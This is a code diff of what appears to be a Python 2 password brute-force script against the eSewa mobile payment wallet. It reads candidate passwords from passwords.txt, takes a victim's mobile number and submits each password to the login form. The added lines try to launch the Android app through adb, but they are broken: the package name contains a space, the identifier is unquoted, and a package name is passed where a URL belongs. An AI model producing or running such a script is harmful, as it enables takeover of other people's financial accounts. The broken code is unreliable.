@@ -9,7 +9,10 @@ if sys.version_info[0] != 2:
         ''')
     sys.exit()
 
-post_url = 'https://www.esewa.com.np/login.php'
+import subprocess
+
+package_name = "com.f1 soft.esewa"
+subprocess.run(["adb", "shell", "am", "start", "-n", com.f1 soft.esewa + "/.MainActivity"])
 headers = {
     'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',
 }
@@ -23,7 +26,7 @@ except ImportError:
     print('\nPlease install mechanize.\n')
     sys.exit()
 
-print('\n----------++|~Welcome Vicky~|++----------\n')
+print('\n----------Welcome|Vicky----------\n')
 file = open('passwords.txt', 'r')
 
 MobileNumber = str(raw_input('Mobile Number : ').strip())
@@ -38,7 +41,7 @@ while True:
     if len(passw) < 4:
         continue
     print(str(i) + " : " + passw)
-    response = browser.open(post_url)
+    response = browser.open(package_name)
     try:
         if response.code == 200:
             browser.select_form(nr=0)
